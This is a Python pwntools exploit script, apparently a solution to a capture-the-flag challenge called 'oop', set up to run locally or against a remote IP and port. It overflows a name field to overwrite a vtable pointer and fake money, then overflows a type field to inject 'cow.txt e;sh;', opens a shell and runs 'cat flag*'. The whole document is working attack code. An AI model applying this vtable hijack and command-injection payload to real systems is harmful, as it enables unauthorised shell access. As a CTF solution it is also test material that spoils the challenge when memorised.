#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'error'

exe = ELF('./oop.patched')

host, port = "193.57.159.27", "62750"

def buy(name):
  p.sendlineafter('>','3')
  p.sendlineafter('>','1')
  p.sendlineafter('animal? ', name)

def sell(idx):
  p.sendlineafter('>','2')
  p.sendlineafter('animal? ', str(idx))
  p.sendlineafter('>','1')

def rename(idx, name):
  p.sendlineafter('>','2')
  p.sendlineafter("animal? ", str(idx))
  p.sendlineafter("> ", "3")
  p.sendlineafter("animal? ", name)


if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    b main
    c
     ''')
  else:
    p = process(exe.path)

buy('A')
buy('B')
rename(0, b'A'*36 + p64(0x405048))		# replace vtable , for changing sell() return value
sell(1)

# we buy a translator now that we are rich
p.sendlineafter('> ', '4')
# and two more animals
buy('C')
buy('D')
# overflow in char type[16],  for command injection
rename(1, b"A"*36 + p64(0x405048) + 'cow.txt e;sh;' )

# launch translate & our command injection
p.sendlineafter('> ', '2')
p.sendlineafter('animal? ', '2')
p.sendlineafter('> ', '4')

# now we got shell
p.sendline('id;cat flag*')
p.interactive()

